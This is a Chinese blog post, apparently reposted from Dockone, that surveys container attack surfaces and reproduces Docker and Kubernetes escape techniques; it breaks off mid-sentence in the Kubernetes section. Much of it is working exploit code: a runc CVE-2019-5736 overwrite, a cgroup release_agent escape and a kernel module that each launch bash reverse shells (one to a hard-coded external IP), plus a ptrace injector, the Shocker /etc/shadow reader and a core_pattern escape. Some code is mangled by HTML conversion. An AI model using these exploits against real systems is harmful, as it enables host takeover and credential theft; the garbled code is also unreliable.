
---
title: '容器环境红队手法总结'
categories: 
 - 编程
 - Dockone
 - 周报
headimg: 'https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/e254ea8ff8fa2cf564eb409a289836b6.png'
author: Dockone
comments: false
date: 2021-11-16 05:07:11
thumbnail: 'https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/e254ea8ff8fa2cf564eb409a289836b6.png'
---

<div>   
<br><h3>引言</h3>随着云原生的火热，容器及容器编排平台的安全也受到了行业关注，Gartner在近期发布的《Kubernetes安全防护指导框架》中给出Kubernetes安全的8个攻击面，总结如下：<br>
<br>镜像相关：<br>
<ul><li>镜像仓库安全</li><li>容器镜像安全</li></ul><br>
<br>Kubernetes组件相关：<br>
<ul><li>API Server</li><li>Controller Manager</li><li>etcd</li><li>Kubelet</li><li>Kube-proxy</li></ul><br>
<br>运行时安全：<br>
<ul><li>Pod内攻击</li><li>容器逃逸</li></ul><br>
<br><div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/e254ea8ff8fa2cf564eb409a289836b6.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/e254ea8ff8fa2cf564eb409a289836b6.png" class="img-polaroid" title="1.png" alt="1.png" referrerpolicy="no-referrer"></a>
</div>
<br>
我们针对其中常见的红队攻击手法进行了复现与总结。<br>
<h3>概念简介</h3>简单来说，容器是一种轻量级的应用及其运行环境打包技术，还包含依赖项，例如编程语⾔运⾏时的特定版本和运⾏软件服务所需的库。容器⽀持在操作系统级别轻松共享CPU、内存、存储空间和⽹络资源，并提供了⼀种逻辑打包机制，以这种机制打包的应⽤可以脱离其实际运⾏的环境。目前，Docker是使用最广泛的一种容器技术。<br>
<br>在开发、运维过程中，容器需要进行部署、管理、扩展和联网等操作，这就引入了一个新的概念，容器的编排。<br>
<br>容器编排是指自动化容器的部署、管理、扩展和联网。容器编排可以为需要部署和管理成百上千个容器和主机的企业提供便利。<br>
<br>容器编排可以在使用容器的任何环境中使用。这可以帮助在不同环境中部署相同的应用，而无需重新设计。通过将微服务放入容器，就能更加轻松地编排各种服务（包括存储、网络和安全防护）。<br>
<br>容器编排工具提供了用于大规模管理容器和微服务架构的框架。容器生命周期的管理有许多容器编排工具可用。一些常见的方案包括：Kubernetes、Docker Swarm和Apache Mesos。其中，目前使用最广的为Kubernetes。<br>
<br>Kubernetes简称K8S，是 Google于2014年开源的容器编排调度管理平台。相比与Swarm、Mesos等平台简化了容器调度与管理，是目前最流行的容器编排平台，Kubernetes主要功能如下：<br>
<ul><li>容器调度管理：基于调度算法与策略将容器调度到对应的节点上运行。</li><li>服务发现与负载均衡：通过域名、VIP对外提供容器服务，提供访问流量负载均衡。</li><li>弹性扩展：定义期待的容器状态与资源，Kubernetes自动检测、创建、删除实例和配置以满足要求。</li><li>自动恢复与回滚：提供健康检查，自动重启、迁移、替换或回滚运行失败或没响应的容器，保障服务可用性。</li><li>Kubernetes对象管理：涉及应用编排与管理、配置、秘钥等、监控与日志等。</li><li>资源管理：对容器使用的网络、存储、GPU等资源进行管理。</li></ul><br>
<br><h3>容器安全机制</h3>每个基础软件服务都存在安全风险，容器也不例外，其自身为控制安全问题的发生，有着自己的安全机制，在此以Docker为例，简单讲述容器的安全机制。<br>
<br>Docker 根据 Linux 系统的一些特性，引入了多种安全机制，包含Seccomp、Capability、Apparmor等。<br>
<h4>Seccomp</h4>seccomp是Linux kernel 从2.6.23版本引入的一种简洁的sandboxing机制。<br>
<br>seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。<br>
<br>Seccomp 简单来说就是一个白名单，每个进程进行系统调用的时候，内核都会检查对应的白名单来确认该进程是否有权限使用这个系统调用。<br>
<h4>Linux Capability</h4>Capability机制是Linux内核2.2之后引入的。本质上是将root用户的权限细分为不同的领域，可以分别的启用或者禁用。Docker默认开启了14种capability，对容器内部root权限进行了一系列限制。<br>
<h4>Apparmor</h4>AppArmor是Linux内核的一个安全模块，通过它可以指定程序是否可以读、写或者运行哪些文件，是否可以打开网络端口等。若可执行文件的路径为/home/ubuntu/run，使用Apparmor对其进行访问控制，需要在配置文件目录/etc/apparmor.d下新建一个名为home.ubuntu.run的文件，若修改run的文件名，配置文件将失效。<br>
<h3>Docker安全问题与逃逸漏洞复现</h3>尽管Docker本身具备Seccomp、Capability、Apparmor等Linux自带的安全机制，但仍存在Linux内核漏洞、Docker漏洞以及配置不当等安全问题。<br>
<h4>Linux 内核漏洞</h4><strong>原理</strong><br>
<br>容器的内核与宿主内核共享，使⽤Namespace与Cgroups这两项技术，使容器内的资源与宿主机隔离，所以Linux内核产⽣的漏洞能导致容器逃逸。<br>
<br>容器逃逸和内核提权只有细微的差别，需要突破namespace的限制。将⾼权限的namespace赋到exploit进程的task_struct中。<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/ba973b1a58709eea00d531dde37f25b0.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/ba973b1a58709eea00d531dde37f25b0.png" class="img-polaroid" title="2.png" alt="2.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<em>容器逃逸简易模型</em><br>
<br><strong>Dirty Cow 引发的容器逃逸</strong><br>
<br>在Linux内核的内存⼦系统处理私有只读内存映射的写时复制（Copy-on-Write，CoW）机制的⽅式中发现了⼀个竞争冲突。⼀个没有特权的本地⽤⼾，可能会利⽤此漏洞获得对其他情况下只读内存映射的写访问权限，从⽽增加他们在系统上的特权，这就是知名的Dirty CoW漏洞。<br>
<br>Dirty CoW漏洞的逃逸的实现思路和上述的思路不太⼀样，采取Overwrite vDSO技术。<br>
<br>vDSO（Virtual Dynamic Shared Object）是内核为了减少内核与⽤⼾空间频繁切换，提⾼系统调⽤效率⽽设计的机制。它同时映射在内核空间以及每⼀个进程的虚拟内存中，包括那些以root权限运⾏的进程。通过调⽤那些不需要上下⽂切换（context switching）的系统调⽤可以加快这⼀步骤（定位vDSO）。vDSO在用户空间（userspace）映射为R/X，⽽在内核空间（kernelspace）则为R/W。这允许我们在内核空间修改它，接着在用户空间执⾏。⼜因为容器与宿主机内核共享，所以可以直接使⽤这项技术逃逸容器。<br>
<br>利⽤步骤如下：<br>
<ol><li>获取vDSO地址，在新版的glibc中可以直接调⽤getauxval()函数获取；</li><li>通过vDSO地址找到clock_gettime()函数地址，检查是否可以hijack；</li><li>创建监听socket；</li><li>触发漏洞，Dirty CoW是由于内核内存管理系统实现CoW时产⽣的漏洞。通过条件竞争，把握好在恰当的时机，利⽤ CoW 的特性可以将⽂件的read-only映射该为write。⼦进程不停地检查是否成功写⼊。⽗进程创建⼆个线程，ptrace_thread线程向vDSO写⼊shellcode。madvise_thread线程释放vDSO映射空间，影响ptrace_thread线程CoW的过程，产⽣条件竞争，当条件触发就能写⼊成功。</li><li>执⾏shellcode，等待从宿主机返回root shell，成功后恢复vDSO原始数据。</li></ol><br>
<br><a href="https://github.com/scumjr/dirtycow-vdso" rel="nofollow" target="_blank">https://github.com/scumjr/dirtycow-vdso</a><br>
<h4>Docker漏洞</h4>Docker 软件架构分为四个部分，集成许多组件，包括containerd、runC等等。<br>
<br>Docker Client是Docker的客户端程序，用于将用户请求发送给Dockerd。Dockerd实际调用的是containerd的API接口，containerd是Dockerd和runC之间的一个中间交流组件，主要负责容器运行、镜像管理等。containerd向上为Dockerd提供了gRPC接口，使得Dockerd屏蔽下面的结构变化，确保原有接口向下兼容；向下，通过containerd-shim与runC结合创建及运行容器。<br>
<br>所以，若这些组件存在问题，也会带来Docker的安全问题。<br>
<br><strong>CVE-2019-5736：runc - container breakout vulnerability</strong><br>
<br>漏洞原理：<br>
<br>runC在使用文件系统描述符时存在漏洞，该漏洞可导致特权容器被利用，造成容器逃逸以及访问宿主机文件系统；攻击者也可以使用恶意镜像，或修改运行中的容器内的配置来利用此漏洞。<br>
<br>攻击方式1：（该途径无需特权容器）运行中的容器被入侵，系统文件被恶意篡改 ==> 宿主机运行docker exec命令，在该容器中创建新进程 ==> 宿主机runc被替换为恶意程序 ==> 宿主机执行docker run/exec 命令时触发执行恶意程序；<br>
<br>攻击方式2：（该途径无需特权容器）docker run命令启动了被恶意修改的镜像 ==> 宿主机runc被替换为恶意程序 ==> 宿主机运行docker run/exec命令时触发执行恶意程序。<br>
<br>当runC在容器内执行新的程序时，攻击者可以欺骗它执行恶意程序。通过使用自定义二进制文件替换容器内的目标二进制文件来实现指回runC二进制文件。<br>
<br>如果目标二进制文件是/bin/bash，可以用指定解释器的可执行脚本替换#!/proc/self/exe。因此，在容器内执行/bin/bash，/proc/self/exe的目标将被执行，将目标指向runC二进制文件。<br>
<br>然后攻击者可以继续写入/proc/self/exe目标，尝试覆盖主机上的runC二进制文件。这里需要使用O_PATH flag打开/proc/self/exe文件描述符，然后以O_WRONLY flag通过/proc/self/fd/重新打开二进制文件，并且用单独的一个进程不停地写入。当写入成功时，runC会退出。<br>
<br>影响版本：<br>
<br>docker version <=18.09.2 && RunC version <=1.0-rc6<br>
<br>漏洞利用：<br>
<br>P.S. 该漏洞会替换原本主机runC文件，造成Docker服务不可用，需要引导被攻击人使用exec去执行/bin/sh或者想要的任何操作。<br>
<pre class="prettyprint">package main<br>
<br>
import (<br>
"fmt"<br>
"io/ioutil"<br>
"os"<br>
"strconv"<br>
"strings"<br>
)<br>
<br>
// This is the line of shell commands that will execute on the host<br>
var payload = "#!/bin/bash \n bash -i >& /dev/tcp/0.0.0.0/1234 0>&1"<br>
<br>
func main() &#123;<br>
// First we overwrite /bin/sh with the /proc/self/exe interpreter path<br>
fd, err := os.Create("/bin/sh")<br>
if err != nil &#123;<br>
fmt.Println(err)<br>
return<br>
&#125;<br>
fmt.Fprintln(fd, "#!/proc/self/exe")<br>
err = fd.Close()<br>
if err != nil &#123;<br>
fmt.Println(err)<br>
return<br>
&#125;<br>
fmt.Println("[+] Overwritten /bin/sh successfully")<br>
<br>
// Loop through all processes to find one whose cmdline includes runcinit<br>
// This will be the process created by runc<br>
var found int<br>
for found == 0 &#123;<br>
pids, err := ioutil.ReadDir("/proc")<br>
if err != nil &#123;<br>
  fmt.Println(err)<br>
  return<br>
&#125;<br>
for _, f := range pids &#123;<br>
  fbytes, _ := ioutil.ReadFile("/proc/" + f.Name() + "/cmdline")<br>
  fstring := string(fbytes)<br>
  if strings.Contains(fstring, "runc") &#123;<br>
    fmt.Println("[+] Found the PID:", f.Name())<br>
    found, err = strconv.Atoi(f.Name())<br>
    if err != nil &#123;<br>
      fmt.Println(err)<br>
      return<br>
    &#125;<br>
  &#125;<br>
&#125;<br>
&#125;<br>
<br>
// We will use the pid to get a file handle for runc on the host.<br>
var handleFd = -1<br>
for handleFd == -1 &#123;<br>
// Note, you do not need to use the O_PATH flag for the exploit to work.<br>
handle, _ := os.OpenFile("/proc/"+strconv.Itoa(found)+"/exe", os.O_RDONLY, 0777)<br>
if int(handle.Fd()) > 0 &#123;<br>
  handleFd = int(handle.Fd())<br>
&#125;<br>
&#125;<br>
fmt.Println("[+] Successfully got the file handle")<br>
<br>
// Now that we have the file handle, lets write to the runc binary and overwrite it<br>
// It will maintain it's executable flag<br>
for &#123;<br>
writeHandle, _ := os.OpenFile("/proc/self/fd/"+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700)<br>
if int(writeHandle.Fd()) > 0 &#123;<br>
  fmt.Println("[+] Successfully got write handle", writeHandle)<br>
  writeHandle.Write([]byte(payload))<br>
  return<br>
&#125;<br>
&#125;<br>
&#125; <br>
</pre><br>
<strong>CVE-2019-14271：docker cp vulnerability</strong><br>
<br>漏洞原理：<br>
<br>docker cp的逻辑漏洞导致宿主机进程会使用容器的so库，而容器的so库我们目前是可控的，我们可以编译一个恶意so库对原生的镜像库进行替换，使宿主进程调用恶意so库过程中执行攻击者定义的危险代码。寻找到libnss_files.so.2的源码，在其中加入链接时启动代码（run_at_link），并定义执行函数，之后对其进行编译，将新生成的libnss_files.so.2送往容器中触发恶意指令。<br>
<br>影响版本：<br>
<br>影响版本只有docker 19.03.0(包含几个beta版)，19.03.1以上以及18.09以下都不受影响。<br>
<br><strong>CVE-2020-15257：docker-containerd --network=host breakout vulnerability</strong><br>
<br>漏洞原理：<br>
<br>该漏洞是由在特定网络环境下Docker容器内部可以访问宿主机的containerdAPI引起的。containerd在操作runC时，会创建相应进程并生成一个抽象socket，docker通过该socket与容器进行控制与通信。该socket可以在宿主机的/proc/net/unix文件中查找到，当Docker容器内部共享了宿主机的网络时，便可通过加载该socket，来控制Docker容器，引发逃逸。<br>
<br>漏洞利用：<a href="https://github.com/ZhuriLab/Exploits/tree/master/cve-2020-15257" rel="nofollow" target="_blank">https://github.com/ZhuriLab/Ex ... 15257</a><br>
<h4>配置不当</h4><strong>Docker API 暴露</strong><br>
<br>docker -H tcp://0.0.0.0:2375 去访问创建等，或者使用 UI。<br>
<br><strong>特权容器</strong><br>
<br>特权容器意味着拥有所有的Capability，即与宿主机 ROOT 权限一致，特权容器逃逸方法有很多。例如，通过挂载硬盘逃逸：<br>
<ul><li><br>fdisk -l<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/e66f11fcd70c563027db9ade5acc5a61.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/e66f11fcd70c563027db9ade5acc5a61.png" class="img-polaroid" title="3.png" alt="3.png" referrerpolicy="no-referrer"></a>
</div>
</li><li><br>mount xxx /mnt<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/946d18adeedc4c13584b446ed42e5f25.jpg" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/946d18adeedc4c13584b446ed42e5f25.jpg" class="img-polaroid" title="4.jpg" alt="4.jpg" referrerpolicy="no-referrer"></a>
</div>
</li></ul><br>
<br><strong>Capability权限过大</strong><br>
<br>查看Docker所拥有的Capability。<br>
<br>cat /proc/1/status | grep Cap<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/cf3af32877e7d513b7ad0dae138e9686.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/cf3af32877e7d513b7ad0dae138e9686.png" class="img-polaroid" title="5.png" alt="5.png" referrerpolicy="no-referrer"></a>
</div>
<br>
capsh --decode=00000000a80425fb<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/4e9e6897bdb0839d407cc65a9cf9f0a4.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/4e9e6897bdb0839d407cc65a9cf9f0a4.png" class="img-polaroid" title="6.png" alt="6.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<br>1、拥有 SYS_ADMIN 权限<br>
<br>通过cgroup进行逃逸，需要--security-opt apparmor=unconfined：<br>
<pre class="prettyprint"># In the container <br>
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x <br>
echo 1 > /tmp/cgrp/x/notify_on_release <br>
host_path=/var/lib/docker/overlay2/e1665b79172f92e72f785c4f1e22f517c5b737ddd8c75504442fbc85f4a13619/diff <br>
echo "/var/lib/docker/overlay2/e1665b79172f92e72f785c4f1e22f517c5b737ddd8c75504442fbc85f4a13619/diff/cmd" > /tmp <br>
/cgrp/release_agent <br>
echo '#!/bin/sh' > /cmd <br>
echo "bash -c 'bash -i >& /dev/tcp/0.0.0.0/1234 0>&1'" >> /cmd <br>
chmod a+x /cmd <br>
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs" <br>
</pre><br>
2、拥有SYS_PTRACE 权限<br>
<br>进程注入引发逃逸，需要--pid=host以及--security-opt apparmor=unconfined：<br>
<pre class="prettyprint">#include <stdio.h><br>
<h1>include <stdlib.h></h1><h1>include <string.h></h1><h1>include <stdint.h></h1><h1>include <sys/ptrace.h></h1><h1>include <sys/types.h></h1><h1>include <sys/wait.h></h1><h1>include <unistd.h></h1><h1>include <sys/user.h></h1><h1>include <sys/reg.h></h1><h1>define SHELLCODE_SIZE 0</h1>unsigned char *shellcode = <br>
"";<br>
int inject_data (pid_t pid, unsigned char *src, void *dst, int len)<br>
&#123;<br>
int i;<br>
uint32_t *s = (uint32_t *) src;<br>
uint32_t *d = (uint32_t *) dst;<br>
for (i = 0; i < len; i+=4, s++, d++)<br>
&#123;<br>
if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)<br>
&#123;<br>
perror ("ptrace(POKETEXT):");<br>
return -1;<br>
&#125;<br>
&#125;<br>
return 0;<br>
&#125;<br>
int main (int argc, char *argv[])<br>
&#123;<br>
pid_t target;<br>
struct user_regs_struct regs;<br>
int syscall;<br>
long dst;<br>
if (argc != 2)<br>
&#123;<br>
fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);<br>
exit (1);<br>
&#125;<br>
target = atoi (argv[1]);<br>
printf ("+ Tracing process %d\n", target);<br>
if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)<br>
&#123;<br>
perror ("ptrace(ATTACH):");<br>
exit (1);<br>
&#125;<br>
printf ("+ Waiting for process...\n");<br>
wait (NULL);<br>
printf ("+ Getting Registers\n");<br>
if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)<br>
&#123;<br>
perror ("ptrace(GETREGS):");<br>
exit (1);<br>
&#125;<br>
<br>
/* Inject code into current RPI position */<br>
printf ("+ Injecting shell code at %p\n", (void*)regs.rip);<br>
inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);<br>
regs.rip += 2;<br>
printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);<br>
if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)<br>
&#123;<br>
perror ("ptrace(GETREGS):");<br>
exit (1);<br>
&#125;<br>
printf ("+ Run it!\n");<br>
if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)<br>
&#123;<br>
perror ("ptrace(DETACH):");<br>
exit (1);<br>
&#125;<br>
return 0;<br>
&#125; <br>
</pre><br>
3、拥有SYS_MODULE 权限<br>
<br>加载内核模块直接逃逸：<br>
<pre class="prettyprint">#include <linux/module.h> /* Needed by all modules */<br>
<h1>include <linux/kernel.h> /* Needed for KERN_INFO */</h1><h1>include <linux/init.h> /* Needed for the macros */</h1><h1>include <linux/sched/signal.h></h1><h1>include <linux/nsproxy.h></h1><h1>include <linux/proc_ns.h></h1>///< The license type -- this affects runtime behavior<br>
MODULE_LICENSE("GPL");<br>
///< The author -- visible when you use modinfo<br>
MODULE_AUTHOR("Nimrod Stoler");<br>
///< The description -- see modinfo<br>
MODULE_DESCRIPTION("NS Escape LKM");<br>
///< The version of the module<br>
MODULE_VERSION("0.1");<br>
static int __init escape_start(void)<br>
&#123;<br>
int rc;<br>
static char *envp[] = &#123;<br>
"SHELL=/bin/bash",<br>
"HOME=/home/cyberark",<br>
"USER=cyberark",<br>
"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",<br>
"DISPLAY=:0",<br>
NULL&#125;;<br>
char *argv[] = &#123;"/bin/bash","-c", "bash -i >& /dev/tcp/106.55.159.102/9999 0>&1", NULL&#125;;<br>
rc = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);<br>
printk("RC is: %i \n", rc);<br>
return 0;<br>
&#125;<br>
static void __exit escape_end(void)<br>
&#123;<br>
printk(KERN_EMERG "Goodbye!\n");<br>
&#125;<br>
module_init(escape_start);<br>
module_exit(escape_end);<br>
-----------------------<br>
ifneq ($(KERNELRELEASE),)<br>
obj-m :=exp.o<br>
else<br>
KDIR :=/lib/modules/$(shell uname -r)/build<br>
all:<br>
make -C $(KDIR) M=$(PWD) modules<br>
clean:<br>
rm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order<br>
endif<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/613ab1619caf3e67edbd7e2da2f2e4c9.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/613ab1619caf3e67edbd7e2da2f2e4c9.png" class="img-polaroid" title="7.png" alt="7.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/c67f64beadd5846176fcea45ec917a04.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/c67f64beadd5846176fcea45ec917a04.png" class="img-polaroid" title="8.png" alt="8.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<strong>dac_read_search</strong><br>
<br>Shocker攻击：<br>
<pre class="prettyprint">#define _GNU_SOURCE<br>
<h1>include <stdio.h></h1><h1>include <sys/types.h></h1><h1>include <sys/stat.h></h1><h1>include <fcntl.h></h1><h1>include <errno.h></h1><h1>include <stdlib.h></h1><h1>include <string.h></h1><h1>include <unistd.h></h1><h1>include <dirent.h></h1><h1>include <stdint.h></h1>struct my_file_handle<br>
&#123;<br>
unsigned int handle_bytes;<br>
int handle_type;<br>
unsigned char f_handle[8];<br>
&#125;;<br>
void die(const char *msg)<br>
&#123;<br>
perror(msg);<br>
exit(errno);<br>
&#125;<br>
void dump_handle(const struct my_file_handle *h)<br>
&#123;<br>
fprintf(stderr, "[*] #=%d, %d, char nh[] = &#123;", h->handle_bytes,<br>
h->handle_type);<br>
for (int i = 0; i < h->handle_bytes; ++i)<br>
&#123;<br>
fprintf(stderr, "0xx", h->f_handle[i]);<br>
if ((i + 1) % 20 == 0)<br>
fprintf(stderr, "\n");<br>
if (i < h->handle_bytes - 1)<br>
fprintf(stderr, ", ");<br>
&#125;<br>
fprintf(stderr, "&#125;;\n");<br>
&#125;<br>
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)<br>
&#123;<br>
int fd;<br>
uint32_t ino = 0;<br>
struct my_file_handle outh = &#123;<br>
.handle_bytes = 8,<br>
.handle_type = 1&#125;;<br>
DIR *dir = NULL;<br>
struct dirent *de = NULL;<br>
path = strchr(path, '/');<br>
// recursion stops if path has been resolved<br>
if (!path)<br>
&#123;<br>
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));<br>
oh->handle_type = 1;<br>
oh->handle_bytes = 8;<br>
return 1;<br>
&#125;<br>
++path;<br>
fprintf(stderr, "[*] Resolving '%s'\n", path);<br>
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)<br>
die("[-] open_by_handle_at");<br>
if ((dir = fdopendir(fd)) == NULL)<br>
die("[-] fdopendir");<br>
for (;;)<br>
&#123;<br>
de = readdir(dir);<br>
if (!de)<br>
break;<br>
fprintf(stderr, "[*] Found %s\n", de->d_name);<br>
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0)<br>
&#123;<br>
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);<br>
ino = de->d_ino;<br>
break;<br>
&#125;<br>
&#125;<br>
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");<br>
if (de)<br>
&#123;<br>
for (uint32_t i = 0; i < 0xffffffff; ++i)<br>
&#123;<br>
outh.handle_bytes = 8;<br>
outh.handle_type = 1;<br>
memcpy(outh.f_handle, &ino, sizeof(ino));<br>
memcpy(outh.f_handle + 4, &i, sizeof(i));<br>
if ((i % (1 << 20)) == 0)<br>
fprintf(stderr, "[*] (%s) Trying: 0xx\n", de->d_name, i);<br>
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0)<br>
&#123;<br>
closedir(dir);<br>
close(fd);<br>
dump_handle(&outh);<br>
return find_handle(bfd, path, &outh, oh);<br>
&#125;<br>
&#125;<br>
&#125;<br>
closedir(dir);<br>
close(fd);<br>
return 0;<br>
&#125;<br>
int main()<br>
&#123;<br>
char buf[0x1000];<br>
int fd1, fd2;<br>
struct my_file_handle h;<br>
struct my_file_handle root_h = &#123;<br>
.handle_bytes = 8,<br>
.handle_type = 1,<br>
.f_handle = &#123;0x02, 0, 0, 0, 0, 0, 0, 0&#125;&#125;;<br>
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"<br>
"[***] The tea from the 90's kicks your sekurity again. [***]\n"<br>
"[***] If you have pending sec consulting, I'll happily [***]\n"<br>
"[***] forward to my friends who drink secury-tea too! [***]\n");<br>
// get a FS reference from something mounted in from outside<br>
if ((fd1 = open("/.dockerinit", O_RDONLY)) < 0)<br>
die("[-] open");<br>
if (find_handle(fd1, "/etc/shadow", &root_h, &h) <= 0)<br>
die("[-] Cannot find valid handle!");<br>
fprintf(stderr, "[!] Got a final handle!\n");<br>
dump_handle(&h);<br>
if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)<br>
die("[-] open_by_handle");<br>
memset(buf, 0, sizeof(buf));<br>
if (read(fd2, buf, sizeof(buf) - 1) < 0)<br>
die("[-] read");<br>
fprintf(stderr, "[!] Win! /etc/shadow output follows:\n%s\n", buf);<br>
close(fd2);<br>
close(fd1);<br>
return 0;<br>
&#125; <br>
</pre><br>
<strong>其他</strong><br>
<br>通过内核漏洞进行逃逸时，有可能存在有些系统调用被禁用而使漏洞无法复现的情况，当一些Capability被赋予时可以使得原先不能在容器内使用的 kernel 漏洞可以使用，例如：<br>
<br>特殊目录被挂载至 Docker 内部引发逃逸<br>
<br>当例如宿主机的内的/, /etc/, /root/.ssh等目录的写权限被挂载进容器时，在容器内部可以修改宿主机内的/etc/crontab、/root/.ssh/、/root/.bashrc等文件执行任意命令，就可以导致容器逃逸。<br>
<br>1、Docker in Docker<br>
<br>其中一个比较特殊且常见的场景是当宿主机的/var/run/docker.sock被挂载容器内的时候，容器内就可以通过docker.sock在宿主机里创建任意配置的容器，此时可以理解为可以创建任意权限的进程，当然也可以控制任意正在运行的容器。<br>
<br>使用golang去调用unix://docker socket，去创建新的Docker。<br>
<br>2、挂载了主机/proc目录<br>
<br>从 mount 信息中找出宿主机内对应当前容器内部文件结构的路径。<br>
<pre class="prettyprint">sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab<br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/4a77cf63067d9b77d4811e2798d52495.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/4a77cf63067d9b77d4811e2798d52495.png" class="img-polaroid" title="9.png" alt="9.png" referrerpolicy="no-referrer"></a>
</div>
<br>
因为宿主机内的 /proc 文件被挂载到了容器内的 /host_proc 目录，所以我们修改/host_proc/sys/kernel/core_pattern文件以达到修改宿主机/proc/sys/kernel/core_pattern的目的。<br>
<pre class="prettyprint">echo -e “|/var/lib/docker/overlay2/a1a1e60a9967d6497f22f5df21b185708403e2af22eab44cfc2de05ff8ae115f/diff/exp.sh \rcore “ > /host_proc/sys/kernel/core_pattern<br>
</pre><br>
需要一个程序在容器里执行并触发segmentation fault使植入的payload即exp.sh在宿主机执行。<br>
<pre class="prettyprint">#include <stdio.h><br>
int main() &#123;<br>
int *a = NULL;<br>
*a = 1;<br>
return 0;<br>
&#125; <br>
</pre><br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/2dd439213f113d21c8a62b728fe601f9.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/2dd439213f113d21c8a62b728fe601f9.png" class="img-polaroid" title="10.png" alt="10.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/322c3dee52ca23df85422daff22eacdb.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/322c3dee52ca23df85422daff22eacdb.png" class="img-polaroid" title="11.png" alt="11.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<div class="aw-upload-img-list active">
<a href="http://dockone.io/uploads/article/20211111/b99e8852770c1cc4e5c94c6c2d53459c.png" target="_blank" data-fancybox-group="thumb" rel="lightbox"><img src="https://cors.zfour.workers.dev/?http://dockone.io/uploads/article/20211111/b99e8852770c1cc4e5c94c6c2d53459c.png" class="img-polaroid" title="12.png" alt="12.png" referrerpolicy="no-referrer"></a>
</div>
<br>
<h3>Kubernetes安全问题与漏洞复现</h3>Kubernetes作为使用最多的容器编排软件，一些错误的配置会引发很多安全问题，使得集群失陷。<br>
<h4>利用大权限的Service Account逃逸</h4>使用Kubernetes做容器编排的话，在Pod启动时，Kubernetes会默认为容器挂载一个Service Account证书。同时，默认情况下Kubernetes会创建一个特有的Service用来指向ApiServer。<br>
<br>有了这两个条件，我们就拥有了在容器内直接和APIServer通信和交互的方式。<br>
<br>类似Docker中Capability的赋予，在创建Pod时制定使用已经给了特定权限的SA，然后可以通过kubectl去进行一些列操作。<br>
<ul><li><br>kubectl edit sa sa-name -n namespace //<br>
<div class="aw-upload-img-list active">
